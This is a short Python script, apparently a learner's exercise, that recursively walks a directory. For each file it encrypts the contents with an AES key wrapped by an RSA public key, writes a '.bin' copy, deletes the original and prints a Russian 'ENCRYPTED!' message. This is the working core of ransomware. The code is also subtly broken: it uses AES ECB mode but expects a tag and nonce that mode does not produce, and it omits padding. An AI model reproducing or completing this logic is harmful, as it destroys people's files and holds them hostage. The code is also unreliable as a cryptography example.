from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os, sys


def crypt(file):
    f = open(file, 'rb')
    data = f.read(); f.close()

    file_out = open(str(file)+'.bin', 'wb')

    recipient_key = RSA.importKey(open('receiver.pem').read())
    session_key = get_random_bytes(16)

    # encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    # encrypt the data with the AES session key
    # cipher_aes = AES.new(session_key, AES.MODE_EAX)
    cipher_aes = AES.new(session_key, AES.MODE_ECB)
    ciphertext, tag = cipher_aes.encrypt(data)

    [file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
    print(file + 'ЗАШИФРОВАН!')
    os.remove(file)


def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)


# walk('/home/kukuepta/Dropbox/python_self_learning/encryption/test')
# crypt('receiver.pem')
walk('test/')
print('-' * 21)
